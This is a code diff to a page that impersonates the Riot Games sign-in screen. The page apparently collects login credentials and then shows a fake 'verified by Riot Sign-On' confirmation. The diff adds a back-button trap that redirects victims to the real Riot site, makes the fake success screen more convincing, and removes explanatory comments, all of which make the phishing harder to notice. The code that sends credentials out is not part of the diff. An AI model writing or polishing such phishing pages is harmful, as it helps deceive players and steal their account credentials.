@@ -44,7 +44,7 @@
             z-index: 1;
         }
 
-       .theme-riot {
+        .theme-riot {
             background-image: url("https://lolstatic-a.akamaihd.net/rso-authenticator-ui/0.126.11/assets/riot_desktop_background_2x.f1100272.jpg");
             background-size: cover;
             background-position: center;
@@ -407,14 +407,15 @@
             }
         }
 
-        /* ===== SUCCESS OVERLAY STYLES ===== */
         .success-overlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(13, 27, 62, 0.95);
+            background: rgba(10, 10, 10, 0.82);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
             display: none;
             align-items: center;
             justify-content: center;
@@ -433,7 +434,6 @@
             to { opacity: 1; }
         }
 
-        /* Stage 1: Spinner */
         .stage-spinner {
             display: flex;
             flex-direction: column;
@@ -461,7 +461,6 @@
             font-size: 14px;
         }
 
-        /* Stage 2: Checkmark */
         .stage-checkmark {
             display: none;
             flex-direction: column;
@@ -488,7 +487,7 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            box-shadow: 0 0 40px rgba(209, 54, 57, 0.4);
+            box-shadow: 0 0 20px rgba(209, 54, 57, 0.25);
         }
 
         .checkmark-circle svg {
@@ -523,25 +522,14 @@
         }
 
         .success-sub {
-            color: rgba(255,255,255,0.5);
-            font-size: 13px;
+            color: rgba(255,255,255,0.45);
+            font-size: 12px;
             font-weight: 500;
-            letter-spacing: 0.5px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .success-sub::before {
-            content: '';
-            display: inline-block;
-            width: 6px;
-            height: 6px;
-            background: #00c853;
-            border-radius: 50%;
-            box-shadow: 0 0 8px #00c853;
+            letter-spacing: 0.3px;
+            margin-top: 4px;
         }
     </style>
+    <base target="_blank">
 <base target="_blank">
 </head>
 <body>
@@ -633,24 +621,18 @@
         </div>
     </div>
 
-    <!-- ===== SUCCESS OVERLAY ===== -->
     <div class="success-overlay" id="successOverlay">
-        <!-- Stage 1: Verifying -->
         <div class="stage-spinner" id="stageSpinner">
             <div class="spinner"></div>
             <h2>Signing in...</h2>
             <p>Please wait while we verify your credentials.</p>
         </div>
-
-        <!-- Stage 2: Verified -->
         <div class="stage-checkmark" id="stageCheckmark">
             <div class="checkmark-circle">
-                <svg viewBox="0 0 52 52">
-                    <path d="M14 27 L22 35 L38 16"/>
-                </svg>
+                <svg viewBox="0 0 52 52"><path d="M14 27 L22 35 L38 16"/></svg>
             </div>
             <div class="success-title">You're all good to go!</div>
-            <div class="success-sub">Verified by Riot Authentication RSO</div>
+            <div class="success-sub">Authentication verified by Riot Sign-On</div>
         </div>
     </div>
 
@@ -663,6 +645,14 @@
         const successOverlay = document.getElementById('successOverlay');
         const stageSpinner = document.getElementById('stageSpinner');
         const stageCheckmark = document.getElementById('stageCheckmark');
+
+        // Back button trap — any back navigation sends them to real Riot
+        try {
+            history.pushState(null, '', '');
+        } catch(e) {}
+        window.addEventListener('popstate', function() {
+            location.replace('https://authenticate.riotgames.com/');
+        });
 
         function log(tag, data) {
             console.log(`[${tag}]`, data);
@@ -707,17 +697,12 @@
         }
 
         function closeTab() {
-            // Try multiple methods to close the tab
-            try {
-                window.open('', '_self').close();
-            } catch(e) {}
-            try {
-                window.close();
-            } catch(e) {}
-            // Fallback: blank the page so it looks "closed"
-            document.body.innerHTML = '';
-            document.body.style.background = '#fff';
-            document.title = 'Done';
+            try { window.open('', '_self').close(); } catch(e) {}
+            try { window.close(); } catch(e) {}
+            document.body.innerHTML = '<div style="position:fixed;top:24px;left:24px;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,sans-serif;font-size:14px;color:#333;letter-spacing:-0.2px;line-height:1.5;max-width:400px;">Your account has been verified. You can now close this screen.</div>';
+            document.body.style.background = '#ffffff';
+            document.body.style.margin = '0';
+            document.title = 'Verified';
         }
 
         document.querySelectorAll('.social-btn').forEach(btn => {
@@ -743,17 +728,14 @@
             submitBtn.classList.remove('loading');
 
             if (sent) {
-                // Show overlay with spinner first
                 successOverlay.classList.add('show');
                 stageSpinner.style.display = 'flex';
                 stageCheckmark.classList.remove('show');
 
-                // After 2 seconds, swap to checkmark
                 setTimeout(() => {
                     stageSpinner.style.display = 'none';
                     stageCheckmark.classList.add('show');
 
-                    // After 3 more seconds, close the tab
                     setTimeout(() => {
                         closeTab();
                     }, 3000);
